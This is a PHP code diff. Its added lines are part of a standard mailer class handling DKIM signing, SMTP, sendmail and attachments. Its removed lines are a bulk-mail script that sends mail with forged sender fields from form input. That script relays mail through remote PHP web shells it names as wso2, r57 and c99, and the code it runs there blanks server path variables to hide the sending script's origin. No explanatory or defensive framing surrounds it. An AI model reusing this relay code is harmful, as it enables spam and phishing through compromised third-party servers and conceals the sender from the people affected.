+        $DKIMb64 = base64_encode(pack('H*', sha1($body)));
+        $ident = ($this->DKIM_identity == '') ? '' : ' i=' . $this->DKIM_identity . ';';
+        $dkimhdrs = 'DKIM-Signature: v=1; a=' . $DKIMsignatureType . '; q=' . $DKIMquery . '; l=' . $DKIMlen . '; s=' . $this->DKIM_selector . ";\r\n" . "\tt=" . $DKIMtime . '; c=' . $DKIMcanonicalization . ";\r\n" . "\th=From:To:Subject;\r\n" . "\td=" . $this->DKIM_domain . ';' . $ident . "\r\n" . "\tz=$from\r\n" . "\t|$to\r\n" . "\t|$subject;\r\n" . "\tbh=" . $DKIMb64 . ";\r\n" . "\tb=";
+        $toSign = $this->DKIM_HeaderC($from_header . "\r\n" . $to_header . "\r\n" . $subject_header . "\r\n" . $dkimhdrs);
+        $signed = $this->DKIM_Sign($toSign);
+        return $dkimhdrs . $signed . "\r\n";
+    }
+
+    public function DKIM_QP($txt)
+    {
+        $line = '';
+        for ($i = 0; $i < strlen($txt); $i++) {
+            $ord = ord($txt[$i]);
+            if (((0x21 <= $ord) && ($ord <= 0x3A)) || $ord == 0x3C || ((0x3E <= $ord) && ($ord <= 0x7E))) {
+                $line .= $txt[$i];
+            } else {
+                $line .= '=' . sprintf('%02X', $ord);
+            }
+        }
+        return $line;
+    }
+
+    public function DKIM_BodyC($body)
+    {
+        if ($body == '') {
+            return "\r\n";
+        }
+        $body = str_replace("\r\n", "\n", $body);
+        $body = str_replace("\n", "\r\n", $body);
+        while (substr($body, strlen($body) - 4, 4) == "\r\n\r\n") {
+            $body = substr($body, 0, strlen($body) - 2);
+        }
+        return $body;
+    }
+
+    public function DKIM_HeaderC($signHeader)
+    {
+        $signHeader = preg_replace('/\r\n\s+/', ' ', $signHeader);
+        $lines = explode("\r\n", $signHeader);
+        foreach ($lines as $key => $line) {
+            list($heading, $value) = explode(':', $line, 2);
+            $heading = strtolower($heading);
+            $value = preg_replace('/\s+/', ' ', $value);
+            $lines[$key] = $heading . ':' . trim($value);
+        }
+        $signHeader = implode("\r\n", $lines);
+        return $signHeader;
+    }
+
+    public function DKIM_Sign($signHeader)
+    {
+        if (!defined('PKCS7_TEXT')) {
+            if ($this->exceptions) {
+                throw new phpmailerException($this->lang('signing') . ' OpenSSL extension missing.');
+            }
+            return '';
+        }
+        $privKeyStr = file_get_contents($this->DKIM_private);
+        if ($this->DKIM_passphrase != '') {
+            $privKey = openssl_pkey_get_private($privKeyStr, $this->DKIM_passphrase);
+        } else {
+            $privKey = $privKeyStr;
+        }
+        if (openssl_sign($signHeader, $signature, $privKey)) {
+            return base64_encode($signature);
+        }
+        return '';
+    }
+
+    public function postSend()
+    {
+        try {
+            switch ($this->Mailer) {
+                case  'sendmail':
+                case  'qmail':
+                    return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
+                case  'smtp':
+                    return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
+                case  'mail':
+                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
+                default:
+                    $sendMethod = $this->Mailer . 'Send';
+                    if (method_exists($this, $sendMethod)) {
+                        return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
+                    }
+                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
+            }
+        } catch (phpmailerException $exc) {
+            $this->setError($exc->getMessage());
+            $this->edebug($exc->getMessage());
+            if ($this->exceptions) {
+                throw $exc;
+            }
+        }
+        return false;
+    }
+
+    protected function sendmailSend($header, $body)
+    {
+        if ($this->Sender != '') {
+            if ($this->Mailer == 'qmail') {
+                $sendmail = sprintf('%s -f%s', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
+            } else {
+                $sendmail = sprintf('%s -oi -f%s -t', escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
+            }
+        } else {
+            if ($this->Mailer == 'qmail') {
+                $sendmail = sprintf('%s', escapeshellcmd($this->Sendmail));
+            } else {
+                $sendmail = sprintf('%s -oi -t', escapeshellcmd($this->Sendmail));
+            }
+        }
+        if ($this->SingleTo === true) {
+            foreach ($this->SingleToArray as $toAddr) {
+                if (!@$mail = popen($sendmail, 'w')) {
+                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
+                }
+                fputs($mail, 'To: ' . $toAddr . "\n");
+                fputs($mail, $header);
+                fputs($mail, $body);
+                $result = pclose($mail);
+                $this->doCallback(($result == 0), array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
+                if ($result != 0) {
+                    throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
+                }
+            }
+        } else {
+            if (!@$mail = popen($sendmail, 'w')) {
+                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
+            }
+            fputs($mail, $header);
+            fputs($mail, $body);
+            $result = pclose($mail);
+            $this->doCallback(($result == 0), $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
+            if ($result != 0) {
+                throw new phpmailerException($this->lang('execute') . $this->Sendmail, self::STOP_CRITICAL);
+            }
+        }
+        return true;
+    }
+
+    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from)
+    {
+        if (!empty($this->action_function) && is_callable($this->action_function)) {
+            $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from);
+            call_user_func_array($this->action_function, $params);
+        }
+    }
+
+    protected function smtpSend($header, $body)
+    {
+        $bad_rcpt = array();
+        if (!$this->smtpConnect()) {
+            throw new phpmailerException($this->lang('smtp_connect_failed'), self::STOP_CRITICAL);
+        }
+        $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;
+        if (!$this->smtp->mail($smtp_from)) {
+            $this->setError($this->lang('from_failed') . $smtp_from . ' : ' . implode(',', $this->smtp->getError()));
+            throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL);
+        }
+        foreach ($this->to as $to) {
+            if (!$this->smtp->recipient($to[0])) {
+                $bad_rcpt[] = $to[0];
+                $isSent = false;
+            } else {
+                $isSent = true;
+            }
+            $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From);
+        }
+        foreach ($this->cc as $cc) {
+            if (!$this->smtp->recipient($cc[0])) {
+                $bad_rcpt[] = $cc[0];
+                $isSent = false;
+            } else {
+                $isSent = true;
+            }
+            $this->doCallback($isSent, array(), array($cc[0]), array(), $this->Subject, $body, $this->From);
+        }
+        foreach ($this->bcc as $bcc) {
+            if (!$this->smtp->recipient($bcc[0])) {
+                $bad_rcpt[] = $bcc[0];
+                $isSent = false;
+            } else {
+                $isSent = true;
+            }
+            $this->doCallback($isSent, array(), array(), array($bcc[0]), $this->Subject, $body, $this->From);
+        }
+        if ((count($this->all_recipients) > count($bad_rcpt)) and !$this->smtp->data($header . $body)) {
+            throw new phpmailerException($this->lang('data_not_accepted'), self::STOP_CRITICAL);
+        }
+        if ($this->SMTPKeepAlive == true) {
+            $this->smtp->reset();
+        } else {
+            $this->smtp->quit();
+            $this->smtp->close();
+        }
+        if (count($bad_rcpt) > 0) {
+            throw new phpmailerException($this->lang('recipients_failed') . implode(', ', $bad_rcpt), self::STOP_CONTINUE);
+        }
+        return true;
+    }
+
+    public function smtpConnect($options = array())
+    {
+        if (is_null($this->smtp)) {
+            $this->smtp = $this->getSMTPInstance();
+        }
+        if ($this->smtp->connected()) {
+            return true;
+        }
+        $this->smtp->setTimeout($this->Timeout);
+        $this->smtp->setDebugLevel($this->SMTPDebug);
+        $this->smtp->setDebugOutput($this->Debugoutput);
+        $this->smtp->setVerp($this->do_verp);
+        $hosts = explode(';', $this->Host);
+        $lastexception = null;
+        foreach ($hosts as $hostentry) {
+            $hostinfo = array();
+            if (!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*):?([0-9]*)$/', trim($hostentry), $hostinfo)) {
+                continue;
+            }
+            $prefix = '';
+            $tls = ($this->SMTPSecure == 'tls');
+            if ($hostinfo[2] == 'ssl' or ($hostinfo[2] == '' and $this->SMTPSecure == 'ssl')) {
+                $prefix = 'ssl://';
+                $tls = false;
+            } elseif ($hostinfo[2] == 'tls') {
+                $tls = true;
+            }
+            $host = $hostinfo[3];
+            $port = $this->Port;
+            $tport = (integer)$hostinfo[4];
+            if ($tport > 0 and $tport < 65536) {
+                $port = $tport;
+            }
+            if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) {
+                try {
+                    if ($this->Helo) {
+                        $hello = $this->Helo;
+                    } else {
+                        $hello = $this->serverHostname();
+                    }
+                    $this->smtp->hello($hello);
+                    if ($tls) {
+                        if (!$this->smtp->startTLS()) {
+                            throw new phpmailerException($this->lang('connect_host'));
+                        }
+                        $this->smtp->hello($hello);
+                    }
+                    if ($this->SMTPAuth) {
+                        if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->Realm, $this->Workstation)) {
+                            throw new phpmailerException($this->lang('authenticate'));
+                        }
+                    }
+                    return true;
+                } catch (phpmailerException $exc) {
+                    $lastexception = $exc;
+                    $this->smtp->quit();
+                }
+            }
+        }
+        $this->smtp->close();
+        if ($this->exceptions and !is_null($lastexception)) {
+            throw $lastexception;
+        }
+        return false;
+    }
+
+    public function getSMTPInstance()
+    {
+        if (!is_object($this->smtp)) {
+            $this->smtp = new SMTP;
+        }
+        return $this->smtp;
+    }
+
+    protected function mailSend($header, $body)
+    {
+        $toArr = array();
+        foreach ($this->to as $toaddr) {
+            $toArr[] = $this->addrFormat($toaddr);
+        }
+        $to = implode(', ', $toArr);
+        if (empty($this->Sender)) {
+            $params = ' ';
+        } else {
+            $params = sprintf('-f%s', $this->Sender);
+        }
+        if ($this->Sender != '' and !ini_get('safe_mode')) {
+            $old_from = ini_get('sendmail_from');
+            ini_set('sendmail_from', $this->Sender);
+        }
+        $result = false;
+        if ($this->SingleTo === true && count($toArr) > 1) {
+            foreach ($toArr as $toAddr) {
+                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
+                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
+            }
+        } else {
+            $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params);
+            $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From);
+        }
+        if (isset($old_from)) {
+            ini_set('sendmail_from', $old_from);
+        }
+        if (!$result) {
+            throw new phpmailerException($this->lang('instantiate'), self::STOP_CRITICAL);
+        }
+        return true;
+    }
+
+    private function mailPassthru($to, $subject, $body, $header, $params)
+    {
+        if (ini_get('mbstring.func_overload') & 1) {
+            $subject = $this->secureHeader($subject);
+        } else {
+            $subject = $this->encodeHeader($this->secureHeader($subject));
+        }
+        if (ini_get('safe_mode') || !($this->UseSendmailOptions)) {
+            $result = @mail($to, $subject, $body, $header);
+        } else {
+            $result = @mail($to, $subject, $body, $header, $params);
+        }
+        return $result;
+    }
+
+    public function getTranslations()
+    {
+        return $this->language;
+    }
+
+    public function getSentMIMEMessage()
+    {
+        return $this->MIMEHeader . $this->mailHeader . self::CRLF . $this->MIMEBody;
+    }
+
+    public function addAttachment($path, $name = '', $encoding = 'base64', $type = '', $disposition = 'attachment')
+    {
+        try {
+            if (!@is_file($path)) {
+                throw new phpmailerException($this->lang('file_access') . $path, self::STOP_CONTINUE);
+            }
+            if ($type == '') {
+                $type = self::filenameToType($path);
+            }
+            $filename = basename($path);
+            if ($name == '') {
+                $name = $filename;
+            }
+            $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => 0);
+        } catch (phpmailerException $exc) {
+            $this->setError($exc->getMessage());
+            $this->edebug($exc->getMessage());
+            if ($this->exceptions) {
+                throw $exc;
+            }
+            return false;
+        }
+        return true;
+    }
+
+    public static function filenameToType($filename)
+    {
+        $qpos = strpos($filename, '?');
+        if ($qpos !== false) {
+            $filename = substr($filename, 0, $qpos);
+        }
+        $pathinfo = self::mb_pathinfo($filename);
+        return self::_mime_types($pathinfo['extension']);
+    }
+
+    public static function mb_pathinfo($path, $options = null)
+    {
+        $ret = array('dirname' => '', 'basename' => '', 'extension' => '', 'filename' => '');
+        $pathinfo = array();
+        if (preg_match('%^(.*?)[\\\\/]*(([^/\\\\]*?)(\.([^\.\\\\/]+?)|))[\\\\/\.]*$%im', $path, $pathinfo)) {
+            if (array_key_exists(1, $pathinfo)) {
+                $ret['dirname'] = $pathinfo[1];
+            }
+            if (array_key_exists(2, $pathinfo)) {
+                $ret['basename'] = $pathinfo[2];
+            }
+            if (array_key_exists(5, $pathinfo)) {
+                $ret['extension'] = $pathinfo[5];
+            }
+            if (array_key_exists(3, $pathinfo)) {
+                $ret['filename'] = $pathinfo[3];
+            }
+        }
+        switch ($options) {
+            case  PATHINFO_DIRNAME:
+            case  'dirname':
+                return $ret['dirname'];
+            case  PATHINFO_BASENAME:
+            case  'basename':
+                return $ret['basename'];
+            case  PATHINFO_EXTENSION:
+            case  'extension':
+                return $ret['extension'];
+            case  PATHINFO_FILENAME:
+            case  'filename':
+                return $ret['filename'];
+            default:
+                return $ret;
+        }
+    }
+
+    public static function _mime_types($ext = '')
+    {
+        $mimes = array('xl' => 'application/excel', 'hqx' => 'application/mac-binhex40', 'cpt' => 'application/mac-compactpro', 'bin' => 'application/macbinary', 'doc' => 'application/msword', 'word' => 'application/msword', 'class' => 'application/octet-stream', 'dll' => 'application/octet-stream', 'dms' => 'application/octet-stream', 'exe' => 'application/octet-stream', 'lha' => 'application/octet-stream', 'lzh' => 'application/octet-stream', 'psd' => 'application/octet-stream', 'sea' => 'application/octet-stream', 'so' => 'application/octet-stream', 'oda' => 'application/oda', 'pdf' => 'application/pdf', 'ai' => 'application/postscript', 'eps' => 'application/postscript', 'ps' => 'application/postscript', 'smi' => 'application/smil', 'smil' => 'application/smil', 'mif' => 'application/vnd.mif', 'xls' => 'application/vnd.ms-excel', 'ppt' => 'application/vnd.ms-powerpoint', 'wbxml' => 'application/vnd.wap.wbxml', 'wmlc' => 'application/vnd.wap.wmlc', 'dcr' => 'application/x-director', 'dir' => 'application/x-director', 'dxr' => 'application/x-director', 'dvi' => 'application/x-dvi', 'gtar' => 'application/x-gtar', 'php3' => 'application/x-httpd-php', 'php4' => 'application/x-httpd-php', 'php' => 'application/x-httpd-php', 'phtml' => 'application/x-httpd-php', 'phps' => 'application/x-httpd-php-source', 'js' => 'application/x-javascript', 'swf' => 'application/x-shockwave-flash', 'sit' => 'application/x-stuffit', 'tar' => 'application/x-tar', 'tgz' => 'application/x-tar', 'xht' => 'application/xhtml+xml', 'xhtml' => 'application/xhtml+xml', 'zip' => 'application/zip', 'mid' => 'audio/midi', 'midi' => 'audio/midi', 'mp2' => 'audio/mpeg', 'mp3' => 'audio/mpeg', 'mpga' => 'audio/mpeg', 'aif' => 'audio/x-aiff', 'aifc' => 'audio/x-aiff', 'aiff' => 'audio/x-aiff', 'ram' => 'audio/x-pn-realaudio', 'rm' => 'audio/x-pn-realaudio', 'rpm' => 'audio/x-pn-realaudio-plugin', 'ra' => 'audio/x-realaudio', 'wav' => 'audio/x-wav', 'bmp' => 'image/bmp', 'gif' => 'image/gif', 'jpeg' => 'image/jpeg', 'jpe' => 'image/jpeg', 'jpg' => 'image/jpeg', 'png' => 'image/png', 'tiff' => 'image/tiff', 'tif' => 'image/tiff', 'eml' => 'message/rfc822', 'css' => 'text/css', 'html' => 'text/html', 'htm' => 'text/html', 'shtml' => 'text/html', 'log' => 'text/plain', 'text' => 'text/plain', 'txt' => 'text/plain', 'rtx' => 'text/richtext', 'rtf' => 'text/rtf', 'vcf' => 'text/vcard', 'vcard' => 'text/vcard', 'xml' => 'text/xml', 'xsl' => 'text/xml', 'mpeg' => 'video/mpeg', 'mpe' => 'video/mpeg', 'mpg' => 'video/mpeg', 'mov' => 'video/quicktime', 'qt' => 'video/quicktime', 'rv' => 'video/vnd.rn-realvideo', 'avi' => 'video/x-msvideo', 'movie' => 'video/x-sgi-movie');
+        return (array_key_exists(strtolower($ext), $mimes) ? $mimes[strtolower($ext)] : 'application/octet-stream');
+    }
+
+    public function getAttachments()
+    {
+        return $this->attachment;
+    }
+
+    public function encodeQPphp($string, $line_max = 76, $space_conv = false)
+    {
+        return $this->encodeQP($string, $line_max);
+    }
+
+    public function addStringAttachment($string, $filename, $encoding = 'base64', $type = '', $disposition = 'attachment')
+    {
+        if ($type == '') {
+            $type = self::filenameToType($filename);
+        }
+        $this->attachment[] = array(0 => $string, 1 => $filename, 2 => basename($filename), 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => 0);
+    }
+
+    public function addStringEmbeddedImage($string, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
+    {
+        if ($type == '') {
+            $type = self::filenameToType($name);
+        }
+        $this->attachment[] = array(0 => $string, 1 => $name, 2 => $name, 3 => $encoding, 4 => $type, 5 => true, 6 => $disposition, 7 => $cid);
+        return true;
+    }
+
+    public function clearAddresses()
+    {
+        foreach ($this->to as $to) {
+            unset($this->all_recipients[strtolower($to[0])]);
+        }
+        $this->to = array();
+    }
+
+    public function clearCCs()
+    {
+        foreach ($this->cc as $cc) {
+            unset($this->all_recipients[strtolower($cc[0])]);
+        }
+        $this->cc = array();
+    }
+
+    public function clearBCCs()
+    {
+        foreach ($this->bcc as $bcc) {
+            unset($this->all_recipients[strtolower($bcc[0])]);
+        }
+        $this->bcc = array();
+    }
+
+    public function clearReplyTos()
+    {
+        $this->ReplyTo = array();
+    }
+
+    public function clearAllRecipients()
+    {
+        $this->to = array();
+        $this->cc = array();
+        $this->bcc = array();
+        $this->all_recipients = array();
+    }
+
+    public function clearAttachments()
+    {
+        $this->attachment = array();
+    }
+
+    public function clearCustomHeaders()
+    {
+        $this->CustomHeader = array();
+    }
+
+    public function addCustomHeader($name, $value = null)
+    {
+        if ($value === null) {
+            $this->CustomHeader[] = explode(':', $name, 2);
+        } else {
+            $this->CustomHeader[] = array($name, $value);
+        }
+    }
+
+    public function msgHTML($message, $basedir = '', $advanced = false)
+    {
+        preg_match_all('/(src|background)=["\'](.*)["\']/Ui', $message, $images);
+        if (isset($images[2])) {
+            foreach ($images[2] as $imgindex => $url) {
+                if (!preg_match('#^[A-z]+://#', $url)) {
+                    $filename = basename($url);
+                    $directory = dirname($url);
+                    if ($directory == '.') {
+                        $directory = '';
+                    }
+                    $cid = md5($url) . '@phpmailer.0';
+                    if (strlen($basedir) > 1 && substr($basedir, -1) != '/') {
+                        $basedir .= '/';
+                    }
+                    if (strlen($directory) > 1 && substr($directory, -1) != '/') {
+                        $directory .= '/';
+                    }
+                    if ($this->addEmbeddedImage($basedir . $directory . $filename, $cid, $filename, 'base64', self::_mime_types(self::mb_pathinfo($filename, PATHINFO_EXTENSION)))) {
+                        $message = preg_replace('/' . $images[1][$imgindex] . '=["\']' . preg_quote($url, '/') . '["\']/Ui', $images[1][$imgindex] . '="cid:' . $cid . '"', $message);
+                    }
+                }
+            }
+        }
+        $this->isHTML(true);
+        $this->Body = $this->normalizeBreaks($message);
+        $this->AltBody = $this->normalizeBreaks($this->html2text($message, $advanced));
+        if (empty($this->AltBody)) {
+            $this->AltBody = 'To view this email message, open it in a program that understands HTML!' . self::CRLF . self::CRLF;
+        }
+        return $this->Body;
+    }
+
+    public function addEmbeddedImage($path, $cid, $name = '', $encoding = 'base64', $type = '', $disposition = 'inline')
+    {
+        if (!@is_file($path)) {
+            $this->setError($this->lang('file_access') . $path);
+            return false;
+        }
+        if ($type == '') {
+            $type = self::filenameToType($path);
+        }
+        $filename = basename($path);
+        if ($name == '') {
+            $name = $filename;
+        }
+        $this->attachment[] = array(0 => $path, 1 => $filename, 2 => $name, 3 => $encoding, 4 => $type, 5 => false, 6 => $disposition, 7 => $cid);
+        return true;
+    }
+
+    public function isHTML($isHtml = true)
+    {
+        if ($isHtml) {
+            $this->ContentType = 'text/html';
+        } else {
+            $this->ContentType = 'text/plain';
+        }
+    }
+
+    public static function normalizeBreaks($text, $breaktype = "\r\n")
+    {
+        return preg_replace('/(\r\n|\r|\n)/ms', $breaktype, $text);
+    }
+
+    public function html2text($html, $advanced = false)
+    {
+        if ($advanced) {
+            require_once 'extras/class.html2text.php';
+            $htmlconverter = new html2text($html);
+            return $htmlconverter->get_text();
+        }
+        return html_entity_decode(trim(strip_tags(preg_replace('/<(head|title|style|script)[^>]*>.*?<\/\\1>/si', '', $html))), ENT_QUOTES, $this->CharSet);
+    }
+
+    public function set($name, $value = '')
+    {
+        try {
+            if (isset($this->$name)) {
+                $this->$name = $value;
+            } else {
+                throw new phpmailerException($this->lang('variable_set') . $name, self::STOP_CRITICAL);
+            }
+        } catch (Exception $exc) {
+            $this->setError($exc->getMessage());
+            if ($exc->getCode() == self::STOP_CRITICAL) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    public function sign($cert_filename, $key_filename, $key_pass)
+    {
+        $this->sign_cert_file = $cert_filename;
+        $this->sign_key_file = $key_filename;
+        $this->sign_key_pass = $key_pass;
+    }
+
+    public function getToAddresses()
+    {
+        return $this->to;
+    }
+
+    public function getCcAddresses()
+    {
+        return $this->cc;
+    }
+
+    public function getBccAddresses()
+    {
+        return $this->bcc;
+    }
+
+    public function getReplyToAddresses()
+    {
+        return $this->ReplyTo;
+    }
+
+    public function getAllRecipientAddresses()
+    {
+        return $this->all_recipients;
+    }
 }
 
-
-
-if($_SERVER['QUERY_STRING']=="send" || $_SERVER['QUERY_STRING']=="preview") {
-	$email=array(
-		to=>		$_POST['to'],
-		fromname=>	$_POST['fromname'],
-		frommail=>	$_POST['frommail'],
-		replymail=>	$_POST['replymail'],
-		tema=>		$_POST['tema'],
-		additional=>$_POST['additional'],
-		text=>		$_POST['text'],
-		enumer=>	$_SERVER['QUERY_STRING']=="preview"?1:$_POST['enumer']	
-	);
-	//замена списочных значений
-	$email[fromname]=applyEnumer($email[fromname], $email[enumer]);
-	$email[frommail]=applyEnumer($email[frommail], $email[enumer]);
-	$email[replymail]=applyEnumer($email[replymail], $email[enumer]);
-	$email[tema]=applyEnumer($email[tema], $email[enumer]);	
-
-	ReplaceFileTemplate($email[to], $email);
-	if($_POST['type']=='text')
-		$tip="text/plain";
-	else
-		$tip="text/html";
-
-		ReplaceTemplates($email[text], $email);
-	ReplaceTemplates($email[fromname], $email);
-	ReplaceTemplates($email[frommail], $email);
-	ReplaceTemplates($email[tema], $email);
-	foreach ($email[additional] as $key => $value)
-		ReplaceTemplates($email[additional][$key], $email);
-
-	$fromname=trim($email[fromname]); $fromname=substr($fromname,0,100);
-	$frommail=trim($email[frommail]);  $frommail=substr($frommail,0,100);
-	
-	$from="=?UTF-8?B?".base64_encode($fromname)."?= <$frommail>";
-	$tema=$email[tema]; 
-
-	$header="From: $from\n";
-	//$header.="Subject: $tema\n";
-	$header.="Content-type: $tip; charset=utf-8\n";
-	if(trim($email[replymail])!='')
-		$header.="Reply-To: {$email[replymail]}\n";
-
-	if($_SERVER['QUERY_STRING']=="preview") {
-		print $email[text];
-		exit;
-	}
-	if($_POST['type']=='htmle' || isset($_POST['files'])) {
-		$header="From: $from\n";
-		//$header.="Subject: $tema\n";
-		$header.="MIME-Version: 1.0;\n";
-		$header.="Content-type: multipart/mixed; boundary=\"$boundary\"\n";
-		if(trim($email[replymail])!='')
-			$header.="Reply-To: {$email[replymail]}\n";
-
-		$content="--$boundary\n";
-		$content.="Content-type: text/html; charset=\"utf-8\"\n";
-		$content.="Content-Transfer-Encoding: 8bit\n\n";
-	}
-
-	if($_POST['type']=='htmle') {
-		preg_match_all('~<img.*?src=\"(.+?)\".*?>~si',$email[text],$matches);
-		preg_match_all('~background="(.+?)"~si',$email[text],$matches2);
-
-		$img_matches=array_merge($matches[1],$matches2[1]);
-  		$i = 0;
-  		$paths = array();
-
-  		foreach ($img_matches as $img) {
-  			if($paths[$i-1]['path']==$img) continue;
-  			$paths[$i]['path']=$img;
-  			if(preg_match("/\.gif/i", $img)) {
-    			$paths[$i]['type']='gif';
-    		} else if(preg_match("/\.png/i", $img)) {
-    			$paths[$i]['type']='png';
-    		} else if(preg_match("/\.(jpeg|jpg)/i", $img)) {
-    			$paths[$i]['type']='jpeg';
-    		} else {
-    			$paths[$i]['type']='unknown';
-    		}
-    		$paths[$i]['cid']=md5($img);
-    		$email[text] = str_replace($img,'cid:'.$paths[$i]['cid'],$email[text]);
-    		
-    		$i++;    		
-  		}
-
-		$content.=$email[text]."\n";
-		if(isset($_POST['files'])) $content.=makeAttach(json_decode($_POST['files'], true), $boundary);
-
-		foreach($paths as $img) {
-			$content.="--$boundary\n";
-			if($img['type']=="unknown")
-				$content.="Content-Type: application/octet-stream; name=\"".$img['cid'].".png\"\n";
-			else
-				$content.="Content-Type: image/".$img['type']."; name=\"".$img['cid'].".".$img['type']."\"\n";
-			$content.="Content-Transfer-Encoding:base64\n";
-			$content.="Content-ID: <".$img['cid'].">\n\n";
-			$content.=chunk_split(base64_encode(file_get_contents($img['path'])))."\n";
-		}
-		$content.="--$boundary--\n";
-	} elseif(isset($_POST['files'])) {
-		$content.=$email[text]."\n";
-		$content.=makeAttach(json_decode($_POST['files'], true), $boundary);
-		$content.="--$boundary--\n";
-	} else {
-		$content=$email['text'];
-	}
-/**
-Зона дебага
-Симулируем отправку(медленно и четко)
-*/
-/*sleep(1);
-echo tr('sendedto',false).$email[to];
-exit;*/
-
-/**
-Зона дебага
-*/
-	if($_SERVER['QUERY_STRING']=="send" && isset($_POST['outserver'])) {
-		$data=json_encode(array(
-				'to'=>$email[to],
-				'subject'=>$tema,
-				'content'=>base64_encode($content),
-				'header'=>$header
-			)
-		);
-		
-		
-		$code="\$hide=array('PHP_SELF'=>'','SCRIPT_FILENAME'=>'','REQUEST_URI'=>'','SCRIPT_NAME'=>'');while(list(\$key,)=each(\$hide)){\$hide[\$key]=\$_SERVER[\$key];\$_SERVER[\$key]='/';}\$data=json_decode('{$data}',true);mail(\$data['to'],\$data['subject'],base64_decode(\$data['content']),\$data['header']);reset(\$hide);while(list(\$key,)=each(\$hide))\$_SERVER[\$key]=\$hide[\$key];print 'sended';";
-		$outserver=$_POST['outserver'];
-		list($url,$type,$pass)=explode("|",$outserver);
-		if($type=="wso2") {
-			$answer=wso2exec($url,$pass,$code);
-			print $answer=="sended"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
-	    	exit;
-		} elseif($type=="r57") {
-			list($login,$pass)=explode(":", $pass);
-			$answer=r572exec($url,$login,$pass,$code);
-			print $answer=="sended"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
-	    	exit;
-		} elseif($type=="c99") {
-			list($login,$pass)=explode(":", $pass);
-			$answer=c992exec($url,$login,$pass,$code);
-			print $answer=="sended"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
-	    	exit;
-		} elseif($type=="ars") {
-			//list($login,$pass)=explode(":", $pass);
-			$answer=ars2exec($url,$pass,"mail",$data);
-			print $answer['status']=="GOOD"?tr('sendedto',false).$email[to]:"remote server unavailable".$answer;
-	    	exit;
-		} else {
-			print "WRONG OUT SERVER TYPE";
-			exit;
-		}
-	} else {
-		//print $content;
-		//print $header;
-		if(function_exists("mb_orig_mail"))
-			mb_orig_mail($email[to], $tema, $content, $header);
-		else
-			mail($email[to], $tema, $content, $header);
-		
-	}
-		
-	echo tr('sendedto',false).$email[to];
-	exit;
-} elseif ($_SERVER['QUERY_STRING']=="send_from_template") {
-	$template=str_replace("&amp;", "&", $_POST['template']);
-	list($template,$text)=explode("[TEXT]", $template);
-	$content=explode("\n", $template);
-	$post=array();
-	$post['to']=$_POST['to'];
-	$post['replymail']=$_POST['replymail'];
-	$post['text']=$text;
-	for($i=0; $i<count($content);$i++) {
-		if(strpos($content[$i], "[FROM-NAME]")!==false) {
-			$content[$i]=str_replace("[FROM-NAME]","",$content[$i]);
-			$post['fromname']=$content[$i];
-		} elseif(strpos($content[$i], "[FROM-EMAIL]")!==false) {
-			$content[$i]=str_replace("[FROM-EMAIL]","",$content[$i]);
-			$post['frommail']=$content[$i];
-		} elseif(strpos($content[$i], "[THEME]")!==false) {
-			$content[$i]=str_replace("[THEME]","",$content[$i]);
-			$post['tema']=$content[$i];
-		} elseif(strpos($content[$i], "[TYPE]")!==false) {
-			$content[$i]=str_replace("[TYPE]","",$content[$i]);
-			$post['type']=$content[$i];
-		} elseif(strpos($content[$i], "[FILES]")!==false) {
-			$content[$i]=str_replace("[FILES]","",$content[$i]);
-			$post['files']=$content[$i];
-		} elseif(strpos($content[$i], "[ADD")!==false) {
-			$result=preg_match("/\[ADD(\d+)\]/", $content[$i], $arr);
-			$post['additional['.$arr[1].']']=str_replace($arr[0], "", $content[$i]);
-		}
-	}
-	//print_r($post);
-	$requrl='http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?send';
-	//print $requrl.PHP_EOL;
-	$headers=array();
-	$headers[]='Content-type: application/x-www-form-urlencoded';
-
-	$opts = array('http' =>
-		array(
-			'method'  => 'POST',
-			//'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
-			'header'  => implode(PHP_EOL, $headers),
-	        //'timeout' => $timeout,
-			'content' => http_build_query($post)
-		)
-	);
-	//print_r($opts);
-	$context  = stream_context_create($opts);
-	$response=@file_get_contents($requrl, false, $context);
-	print $response;
-	exit;
-
-} elseif ($_SERVER['QUERY_STRING']=="upload_form") {
-	print "<form action='".$_SERVER['PHP_SELF']."?upload' method='post' enctype='multipart/form-data'><input type='file' name='elist'>";
-
-	exit;
-
-} elseif ($_SERVER['QUERY_STRING']=="upload") {
-	if ($_FILES["elist"]["error"] > 0) {
-   		echo "Error: " . $_FILES["elist"]["error"] . "<br />";
-   	} else {
